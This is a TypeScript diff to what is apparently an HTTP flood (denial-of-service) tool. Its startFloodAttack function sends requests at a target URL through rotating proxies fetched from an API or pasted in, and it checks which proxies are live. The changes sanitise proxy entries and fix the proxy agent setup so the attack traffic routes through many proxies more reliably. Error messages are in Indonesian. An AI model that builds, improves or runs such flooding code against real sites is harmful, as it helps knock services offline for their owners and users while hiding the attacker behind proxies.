@@ -18,6 +18,17 @@ const PROXY_TEST_TIMEOUT_MS = 7000;
 const CONCURRENT_PROXY_CHECKS = 10;
 const PROXY_REFRESH_INTERVAL_MS = 5000; // 5 seconds for dynamic proxy refresh
 
+// Helper to sanitize and validate individual proxy entries
+const sanitizeProxyEntry = (entry: string): string | null => {
+  const trimmed = entry.trim();
+  const withoutScheme = trimmed.replace(/^(http(s)?:\/\/)/i, '');
+  // Basic validation: must contain a colon and not be just a scheme
+  if (withoutScheme.includes(':') && withoutScheme.lastIndexOf(':') > 0 && withoutScheme.length > 3) {
+    return withoutScheme;
+  }
+  return null;
+};
+
 export async function startFloodAttack(
   targetUrl: string,
   method: string,
@@ -94,9 +105,9 @@ export async function startFloodAttack(
             const text = await response.text();
             if (text.trim()) {
                 const lines = text.trim().split('\n');
-                const strippedLines = lines.map(line => line.trim().replace(/^(http(s)?:\/\/)/i, '')).filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://"));
-                if (strippedLines.length > 0) return strippedLines;
-                console.warn(`Proxy API ${url} returned empty or invalid list during fetch operation.`);
+                const sanitizedProxies = lines.map(sanitizeProxyEntry).filter(p => p !== null) as string[];
+                if (sanitizedProxies.length > 0) return sanitizedProxies;
+                console.warn(`Proxy API ${url} returned empty or no valid ip:port entries after sanitization.`);
             } else {
                 console.warn(`Proxy API ${url} returned empty content during fetch operation.`);
             }
@@ -111,13 +122,13 @@ export async function startFloodAttack(
 
   const parseProxiesFromString = (str: string | undefined): string[] => {
     if (!str || !str.trim()) return [];
-    const parsed = str.split('\n')
-        .map(line => line.trim())
-        .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://"));
-    if (parsed.length === 0 && str.trim().length > 0) {
-        console.warn("Provided proxiesString from textarea could not be parsed into valid proxy entries.");
+    const sanitizedProxies = str.split('\n')
+        .map(sanitizeProxyEntry)
+        .filter(p => p !== null) as string[];
+    if (sanitizedProxies.length === 0 && str.trim().length > 0) {
+        console.warn("Provided proxiesString from textarea could not be parsed into valid ip:port entries after sanitization.");
     }
-    return parsed;
+    return sanitizedProxies;
   };
 
   // Initial proxy setup
@@ -129,12 +140,12 @@ export async function startFloodAttack(
         lastProxyRefreshTime = Date.now();
         console.log(`Initialized with ${currentActiveProxies.length} proxies from API.`);
     } else {
-        console.warn("Initial API proxy fetch failed or returned empty. Checking textarea for fallback.");
+        console.warn("Initial API proxy fetch failed or returned no valid proxies. Checking textarea for fallback.");
         currentActiveProxies = parseProxiesFromString(proxiesString);
         if (currentActiveProxies.length > 0) {
             console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea (API fallback).`);
         } else if (proxiesString && proxiesString.trim().length > 0){
-             return { totalSent: 0, successful: 0, failed: 0, error: "Gagal mengambil proksi dari API dan string proksi dari textarea tidak valid." };
+             return { totalSent: 0, successful: 0, failed: 0, error: "Gagal mengambil proksi dari API dan string proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan." };
         } else {
             console.log("No proxies available from API or textarea for initial load.");
         }
@@ -144,7 +155,7 @@ export async function startFloodAttack(
     if (currentActiveProxies.length > 0) {
         console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea.`);
     } else if (proxiesString && proxiesString.trim().length > 0) {
-        return { totalSent: 0, successful: 0, failed: 0, error: "String proksi dari textarea tidak valid. Tidak ada URL API yang diberikan." };
+        return { totalSent: 0, successful: 0, failed: 0, error: "String proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan. Tidak ada URL API yang diberikan." };
     } else {
         console.log("No proxies provided via textarea or API URL.");
     }
@@ -169,7 +180,7 @@ export async function startFloodAttack(
             lastProxyRefreshTime = Date.now();
             console.log(`Refreshed. Now using ${currentActiveProxies.length} proxies from API. Total sent: ${totalSent}`);
         } else {
-            console.warn("Proxy refresh from API failed or returned empty. Continuing with existing proxy list (if any).");
+            console.warn("Proxy refresh from API failed or returned no valid proxies. Continuing with existing proxy list (if any).");
         }
       }
 
@@ -190,13 +201,14 @@ export async function startFloodAttack(
 
         if (currentActiveProxies.length > 0) {
           const proxyConfig = currentActiveProxies[totalSent % currentActiveProxies.length];
+          // The HttpsProxyAgent expects the proxy string without the scheme, e.g., "user:pass@host:port" or "host:port"
           try {
-            const agent = new HttpsProxyAgent(proxyConfig);
+            const agent = new HttpsProxyAgent(`http://${proxyConfig}`); // HttpsProxyAgent needs a scheme for its internal URL parsing, but it uses the host/port/auth from it.
             currentFetchOptions.agent = agent as any;
           } catch (e) {
             console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
             failed++;
-            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1;
+            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // Mark as network/proxy error
             totalSent++;
             continue;
           }
@@ -216,9 +228,9 @@ export async function startFloodAttack(
             .catch((e: any) => {
               failed++;
               if (e.name === 'AbortError' || e.name === 'TimeoutError') {
-                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1;
+                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; // Mark as timeout/abort
               } else {
-                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1;
+                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // Mark as other network/proxy error
               }
             })
             .finally(() => {
@@ -254,14 +266,14 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
     return { error: "URL API tidak boleh kosong." };
   }
   try {
-    new URL(apiUrl);
+    new URL(apiUrl); // Validates URL format
   } catch (e) {
     return { error: "Format URL API tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
   }
 
   try {
     const response = await fetch(apiUrl, {
-      signal: AbortSignal.timeout(10000),
+      signal: AbortSignal.timeout(10000), // 10-second timeout for fetching proxies
       headers: { 'Accept': 'text/plain' }
     });
     if (!response.ok) {
@@ -273,9 +285,13 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
     }
 
     const lines = text.trim().split('\n');
-    const strippedLines = lines.map(line => line.trim().replace(/^(http(s)?:\/\/)/i, '')).filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://"));
+    const sanitizedProxies = lines.map(sanitizeProxyEntry).filter(p => p !== null) as string[];
 
-    return { proxies: strippedLines.join('\n') };
+    if (sanitizedProxies.length === 0) {
+        return { error: "API tidak mengembalikan entri proksi yang valid dalam format ip:port setelah pembersihan." };
+    }
+
+    return { proxies: sanitizedProxies.join('\n') };
   } catch (e: any) {
     console.error("Kesalahan mengambil proksi dari API:", e);
     if (e.name === 'TimeoutError') {
@@ -297,9 +313,16 @@ export async function checkProxies(proxiesString: string): Promise<{
     return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
   }
 
+  // ProxiesString is expected to be pre-validated by the form (no http schemes)
+  // or pre-sanitized if coming from an internal source.
+  // This function primarily focuses on reachability.
   const proxyEntries = proxiesString.split('\n')
     .map(line => line.trim())
-    .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://"));
+    .filter(line => {
+      // Ensure no schemes and basic host:port structure
+      if (line.startsWith("http://") || line.startsWith("https://")) return false;
+      return line.includes(':') && line.lastIndexOf(':') > 0 && line.length > 3;
+    });
 
   if (proxyEntries.length === 0) {
     return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "Tidak ada proksi dalam format host:port yang benar ditemukan untuk diperiksa. Pastikan skema http(s):// telah dihapus." };
@@ -310,14 +333,18 @@ export async function checkProxies(proxiesString: string): Promise<{
 
   const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => {
     try {
-      const agent = new HttpsProxyAgent(proxyUrl);
+      // HttpsProxyAgent needs a scheme for its internal URL parsing.
+      // The proxyUrl itself should be scheme-less, e.g., "user:pass@host:port" or "host:port"
+      const agent = new HttpsProxyAgent(`http://${proxyUrl}`);
       const response = await fetch(PROXY_TEST_URL, {
         agent: agent as any,
         signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
-        redirect: 'manual',
+        redirect: 'manual', // We only care about reachability, not the content of the redirect
       });
+      // Google's generate_204 returns 204. Other test URLs might return 200.
       return response.status === 204 || response.status === 200;
     } catch (error: any) {
+      // console.warn(`Proxy check failed for ${proxyUrl}: ${error.message}`);
       return false;
     }
   };
@@ -336,6 +363,7 @@ export async function checkProxies(proxiesString: string): Promise<{
           deadCount++;
         }
       } else {
+        // Promise rejected (e.g., unexpected error in checkSingleProxy)
         deadCount++;
       }
     });
@@ -348,4 +376,3 @@ export async function checkProxies(proxiesString: string): Promise<{
     totalChecked: proxyEntries.length,
   };
 }
-
